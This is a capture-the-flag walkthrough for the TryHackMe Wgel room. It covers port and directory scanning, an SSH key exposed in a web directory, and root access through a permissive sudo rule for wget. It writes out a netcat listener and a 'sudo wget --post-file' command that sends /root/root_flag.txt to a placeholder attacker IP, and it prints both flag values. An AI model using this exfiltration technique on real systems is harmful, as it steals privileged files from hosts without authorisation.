# TryHackMe – Wgel CTF

![Platform](https://img.shields.io/badge/Platform-Linux-blue?logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Status](https://img.shields.io/badge/Status-Completed-success)

A walkthrough of the **Wgel CTF** room on TryHackMe. This report follows the supplied terminal and browser screenshots, documenting the web enumeration, exposed SSH private key, initial access, and privilege escalation using `wget`.

## 1. Reconnaissance

Started with an Nmap service/version and default-script scan to identify the exposed services.

```bash
nmap -sV -sC <TARGET_IP>
```

The scan identified:

|  Port  | Service |        Version / details        |
|--------|---------|---------------------------------|
| 22/tcp |   SSH   | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp |   HTTP  |  Apache httpd 2.4.18 (Ubuntu)   |

The web server returned the default Apache Ubuntu page.

<img width="815" height="322" alt="1" src="https://github.com/user-attachments/assets/2bf9ebe4-1b95-4b21-929a-77c72139fd12" />

## 2. Web Enumeration

### 2.1 Directory discovery

Used Gobuster with the common directory wordlist to enumerate the web root.

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/dirb/wordlists/common.txt
```

The scan revealed a `/sitemap/` directory.

<img width="758" height="423" alt="2" src="https://github.com/user-attachments/assets/1250b90b-ed0f-456a-9680-f40b7b9fe493" />

Browsing the directory showed a website template. Reviewing the page source exposed a comment mentioning Jessie and reminding them to update the website. This provided a useful username clue for later access.

<img width="1291" height="646" alt="3" src="https://github.com/user-attachments/assets/b1f8ba01-c270-4a39-80db-a29b7f6d466f" />

<img width="673" height="171" alt="1-2" src="https://github.com/user-attachments/assets/64d4e989-7900-409a-88c0-1ddd577feb70" />

### 2.2 Enumerating the sitemap

Enumerated the discovered directory as well:

```bash
gobuster dir -u http://<TARGET_IP>/sitemap/ -w /usr/share/dirb/wordlists/common.txt
```

The results included an `.ssh` directory.

<img width="788" height="475" alt="4" src="https://github.com/user-attachments/assets/cc7f215d-a092-4229-bd71-45960062eb2a" />

## 3. Discovering the SSH Private Key

Navigating to `/sitemap/.ssh/` revealed directory listing enabled on the server. The listing exposed an `id_rsa` file.

<img width="771" height="281" alt="5" src="https://github.com/user-attachments/assets/7b7dd9bd-0ef2-46ed-9a2a-4f3a97b4934d" />

Opening the file displayed an RSA private key. This is a serious information disclosure: private SSH keys should never be placed in a publicly accessible web directory.

<img width="741" height="497" alt="5-2" src="https://github.com/user-attachments/assets/587f5f20-d01e-4615-9097-f19ddc20108a" />

Save the key locally (copy the complete key, including the BEGIN and END lines) and restrict its permissions before using it:

```bash
nano id_rsa
chmod 600 id_rsa
```

## 4. Initial Access

The source-code comment identified `jessie` as the likely account name. Used the discovered key to connect over SSH:

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

The screenshot shows a successful login to the target as `jessie`.

<img width="680" height="467" alt="6" src="https://github.com/user-attachments/assets/49db4cc2-58be-4932-a5e0-2133ae38a47a" />

## 5. User Flag

After logging in, inspected the home directory and navigated to `Documents`:

```bash
ls
cd Documents
ls
cat user_flag.txt
```

The user flag shown in the supplied screenshot is:

```text
057c67131c3d5e42dd5cd3075b198FF6
```

<img width="780" height="161" alt="7" src="https://github.com/user-attachments/assets/e170b944-30ba-4de6-b3ec-e664050fd5b7" />

## 6. Privilege Escalation

The final screenshot demonstrates that Jessie can run `wget` with elevated privileges to read `/root/root_flag.txt` and send its contents to a listener controlled by the lab operator. In a normal enumeration workflow, inspect allowed sudo commands first:

```bash
sudo -l
```

The relevant weakness is an overly permissive sudo rule for `wget`. Because `wget` can make HTTP requests and upload a local file with `--post-file`, an allowed root execution can disclose files that the regular user cannot read.

On the attacker machine, start a listener:

```bash
nc -lvnp 4444
```

From the target, the screenshot shows the following command (replace the callback address with your own lab machine's reachable IP):

```bash
sudo wget --post-file=/root/root_flag.txt http://<ATTACKER_IP>:4444
```

This sends the contents of the root flag file in the HTTP POST request to the listener. The supplied screenshot shows the request arriving and the flag value in the received body.

<img width="850" height="337" alt="8" src="https://github.com/user-attachments/assets/b3e8bd6c-4495-4d90-81a2-0a32eb254947" />

## 7. Root Flag

The root flag captured in the listener output is:

```text
b1b968b37519ad1daa6408188649263d
```
